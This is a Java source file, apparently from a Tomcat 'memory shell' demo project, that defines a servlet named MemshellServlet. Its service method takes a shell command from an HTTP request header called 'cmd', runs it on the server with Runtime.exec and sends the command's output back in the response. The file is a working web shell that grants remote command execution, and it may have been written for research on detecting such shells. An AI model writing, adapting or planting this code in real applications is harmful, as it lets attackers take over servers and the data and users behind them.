package com.example.tomcatmemshell.demos.web.addservlet;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import javax.servlet.Servlet;
import javax.servlet.ServletConfig;
import javax.servlet.ServletException;
import javax.servlet.ServletRequest;
import javax.servlet.ServletResponse;
import javax.servlet.http.HttpServletRequest;


public class MemshellServlet implements Servlet {
    public void init(ServletConfig servletConfig) {
    }

    public ServletConfig getServletConfig() {
        return null;
    }

    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        HttpServletRequest req = (HttpServletRequest) servletRequest;
        String cmd = req.getHeader("cmd");
        if (cmd != null){
            Process p=Runtime.getRuntime().exec(cmd);
            InputStream inputStream = p.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));
            String line;
            while ((line = reader.readLine()) != null) {
                servletResponse.getWriter().println(line);
            }
            try {
                p.waitFor();
            } catch (InterruptedException e) {

            }
        }
    }

    public String getServletInfo() {
        return null;
    }

    public void destroy() {
    }
}